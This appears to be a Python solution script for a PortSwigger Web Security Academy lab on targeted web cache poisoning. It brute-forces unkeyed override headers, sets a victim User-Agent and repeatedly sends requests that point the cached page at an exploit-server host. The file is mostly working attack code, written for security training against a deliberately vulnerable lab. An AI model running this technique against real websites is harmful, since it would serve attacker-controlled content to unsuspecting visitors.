"""
Lab 4: Targeted web cache poisoning using an unknown header
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header
Difficulty: Practitioner

📝 Must poison the cache for a SPECIFIC subset of users only (the cache
keys on User-Agent via a Vary header, so poisoning has to target a
particular UA string). First brute-force which unknown header the app
actually reads (no hint given), then target the right UA segment.
"""

from utils import get_session, cache_status, poison_until_hit, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_HOST = "exploit-YOUR-LAB-ID.exploit-server.net"

# Candidate headers to brute-force — a real Param Miner run covers many
# more; this is a reasonable manual starting set.
CANDIDATE_HEADERS = [
    "X-Host", "X-Forwarded-Server", "X-HTTP-Host-Override",
    "Forwarded", "X-Original-URL", "X-Rewrite-URL",
]

VICTIM_USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"  # confirm the lab's victim UA


def find_unkeyed_header(session):
    for header in CANDIDATE_HEADERS:
        marker = "pollutiontest123"
        r = session.get(f"{TARGET}/?cb=probe", headers={header: marker})
        if marker in r.text:
            log(f"Candidate header reflected: {header}")
            return header
        log(f"{header}: not reflected", ok=False)
    return None


def run():
    s = get_session()

    note("Step 1: find which unknown header the app actually reads.")
    header_name = find_unkeyed_header(s)
    if not header_name:
        log("No candidate header reflected — expand CANDIDATE_HEADERS.", ok=False)
        return

    note(f"Step 2: poison using {header_name}, targeting the specific victim")
    note("User-Agent (since UA IS part of this cache's key via Vary).")
    s.headers.update({"User-Agent": VICTIM_USER_AGENT})

    poison_until_hit(s, f"{TARGET}/?cb=probe", headers={header_name: EXPLOIT_HOST})

    note("Step 3: re-poison the real URL without the cache-buster, UA still set.")
    r = poison_until_hit(s, f"{TARGET}/", headers={header_name: EXPLOIT_HOST})
    if r:
        log(f"Poisoned for target UA segment: {EXPLOIT_HOST in r.text}")


if __name__ == "__main__":
    run()
